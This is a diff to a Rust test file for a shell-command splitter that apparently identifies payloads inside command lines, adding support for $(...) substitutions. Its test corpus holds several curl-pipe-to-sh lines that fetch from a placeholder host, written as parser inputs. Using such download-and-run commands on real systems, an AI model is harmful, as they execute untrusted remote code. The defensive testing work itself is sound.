@@ -27,6 +27,11 @@ const SHAPES: &[&str] = &[
     "echo ''",
     "echo \"\"",
     "curl $(printf https://one.example) | sh",
+    "curl $(true; printf https://one.example/x) | sh",
+    "curl $(echo $(printf https://one.example)) | sh",
+    "curl \"$(printf 'a;b')\" | sh",
+    "curl $(unterminated | sh",
+    "echo ')' not a close | sh",
     "curl `printf https://one.example` | sh",
     "echo 'unterminated",
     "echo \"unterminated",
@@ -50,13 +55,17 @@ const SHAPES: &[&str] = &[
 enum Byte {
     /// A quote mark, which is syntax and belongs in no word.
     Delimiter,
-    /// Handed over, and inside quotes or not.
-    Content { quoted: bool },
+    /// Handed over rather than acted on. `held` is the whole question a
+    /// boundary has to respect: inside quotes, or inside a substitution the
+    /// shell passes to a reading of its own — either way a separator there
+    /// is a character in a word and never the end of a command.
+    Content { held: bool },
 }
 
 fn reading(line: &str) -> Vec<Byte> {
-    let mut read = vec![Byte::Content { quoted: false }; line.len()];
+    let mut read = vec![Byte::Content { held: false }; line.len()];
     let (mut single, mut double) = (false, false);
+    let mut depth = 0usize;
     let mut chars = line.char_indices().peekable();
     let mark = |read: &mut [Byte], at: usize, c: char, byte: Byte| {
         for held in read.iter_mut().skip(at).take(c.len_utf8()) {
@@ -68,8 +77,8 @@ fn reading(line: &str) -> Vec<Byte> {
             '\\' if !single => {
                 mark(&mut read, at, c, Byte::Delimiter);
                 if let Some((next, escaped)) = chars.next() {
-                    let quoted = single || double;
-                    mark(&mut read, next, escaped, Byte::Content { quoted });
+                    let held = single || double || depth > 0;
+                    mark(&mut read, next, escaped, Byte::Content { held });
                 }
             }
             '\'' if !double => {
@@ -80,9 +89,17 @@ fn reading(line: &str) -> Vec<Byte> {
                 double = !double;
                 mark(&mut read, at, c, Byte::Delimiter);
             }
+            '$' if !single && chars.peek().is_some_and(|(_, next)| *next == '(') => {
+                depth += 1;
+                mark(&mut read, at, c, Byte::Content { held: true });
+            }
+            ')' if !single && !double && depth > 0 => {
+                depth -= 1;
+                mark(&mut read, at, c, Byte::Content { held: depth > 0 });
+            }
             _ => {
-                let quoted = single || double;
-                mark(&mut read, at, c, Byte::Content { quoted });
+                let held = single || double || depth > 0;
+                mark(&mut read, at, c, Byte::Content { held });
             }
         }
     }
@@ -171,20 +188,22 @@ fn a_reading_only_ever_gives_back_what_the_line_said() {
     }
 }
 
-/// A boundary between two commands never falls inside quotes.
+/// A boundary between two commands never falls inside something the shell
+/// hands over rather than acts on.
 ///
-/// This is the whole of what a separator means: a `;` inside quotes is a
-/// character the shell hands over, and splitting there makes two commands
-/// the line does not have — the second holding the payload, which then
-/// belongs to nothing and is never named.
+/// This is the whole of what a separator means. A `;` inside quotes, or
+/// inside a substitution, is a character in a word — splitting there makes
+/// two commands the line does not have, the second holding the payload,
+/// which then belongs to nothing and is never named. One property for both,
+/// because they are one mistake.
 #[test]
-fn no_command_ends_inside_something_quoted() {
+fn no_command_ends_inside_something_the_shell_hands_over() {
     for line in corpus() {
         let inside = reading(&line);
         let read = commands(&line);
         for pair in read.windows(2) {
             let quoted: Vec<usize> = (pair[0].at.end..pair[1].at.start)
-                .filter(|at| matches!(inside[*at], Byte::Content { quoted: true }))
+                .filter(|at| matches!(inside[*at], Byte::Content { held: true }))
                 .collect();
             assert!(
                 quoted.is_empty(),
